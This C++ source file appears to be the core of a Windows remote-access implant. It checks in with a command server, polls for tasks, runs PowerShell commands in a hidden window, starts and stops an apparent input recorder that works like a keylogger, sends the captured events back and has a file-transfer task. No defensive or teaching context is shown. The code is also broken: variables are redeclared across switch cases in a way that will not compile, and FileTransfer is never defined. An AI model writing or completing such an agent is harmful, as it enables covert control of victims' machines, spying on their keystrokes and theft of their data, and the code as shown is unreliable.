//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
#include "Agent.h"
#include "CommManager.h"
#include "CheckinModels.h"
#include "TaskQueueManager.h"
#include "AgentModule.h"
#include <windows.h>
#include <vector>

void Agent::Exit()
{
    // Exit agent process
    ExitProcess(0);
}

InputIntentRecorder &Agent::GetInputIntentRecorder()
{
    return recorder_;
}

std::string Agent::GetUID()
{
    char username[256];
    DWORD username_len = sizeof(username);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len))
    {
        return std::string(username);
    }

    return std::string();
}

std::string Agent::ExecuteCommand(int commandType)
{
    switch (commandType)
    {
    case 0x0017:
        return GetUID();
    default:
        return std::string();
    }
}

std::string Agent::ExecutePowerShell(const std::string &command)
{
#ifdef _WIN32
    // Execute PowerShell command and return the output
    std::string result;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hRead = nullptr;
    HANDLE hWrite = nullptr;

    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    {
        return "Failed to create pipe.";
    }

    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    std::string psCommand = "powershell.exe -NoProfile -NonInteractive -Command \"" + command + "\"";

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;

    PROCESS_INFORMATION pi{};

    BOOL success = CreateProcessA(
        nullptr,
        psCommand.data(),
        nullptr,
        nullptr,
        TRUE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi);

    if (!success)
    {
        CloseHandle(hWrite);
        return "Failed to create process.";
    }

    CloseHandle(hWrite);

    char buffer[4096];
    DWORD bytesRead = 0;

    while (ReadFile(
               hRead,
               buffer,
               sizeof(buffer),
               &bytesRead,
               nullptr) &&
           bytesRead > 0)
    {
        result.append(buffer, bytesRead);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    return result;
#else
    (void)command; // Suppress unused parameter warning
    return "PowerShell execution is only supported on Windows.";
#endif
}

void Agent::StartInputIntentRecorder()
{
    recorder_.start();
}

std::string Agent::StopInputIntentRecorder()
{
    recorder_.stop();

    return recorder_.events();
}

void Agent::Init()
{
    // Initialize agent
    user = GetUID();
}

std::string Agent::GetUser() const
{
    return user;
}

int main(int argc, char *argv[])
{

    AgentModule agentMod;
    TaskQueueManager taskManager;
    CommManager manager = CommManager();

    IntitalCheckinRequest intialRequest = agentMod.GetHostInformation();
    manager.IntialCheckin(intialRequest.StructToJson());
    Agent agent;
    agent.Init();

    while (true)
    {
        if (!taskManager.HasPendingResult())
        {
            taskManager.QueueTask(manager.Checkin());
        }
        else
        {
            std::string newTask = manager.Checkin(taskManager.GetTaskResult());
            taskManager.QueueTask(newTask);
        }

        if (taskManager.HasPendingTask())
        {
            CheckinResponse task = taskManager.GetNextTask();
            switch (task.type)
            {
            case 1:
                std::string result = agent.ExecutePowerShell(task.powerShellCommand.commandlet);
                taskManager.StoreTaskResult(task.id, true, result);
                break;
            case 18:
                agent.StartInputIntentRecorder();
                break;
            case 19:
                std::string result = agent.StopInputIntentRecorder();
                taskManager.StoreTaskResult(task.id, true, result);
                break;

            case 20:
                std::string result = agent.FileTransfer();
                taskManager.StoreTaskResult(task.id, true, result);
                break;
            }
        }
        Sleep(5000);
    }
    return 0;
}

//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { END OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
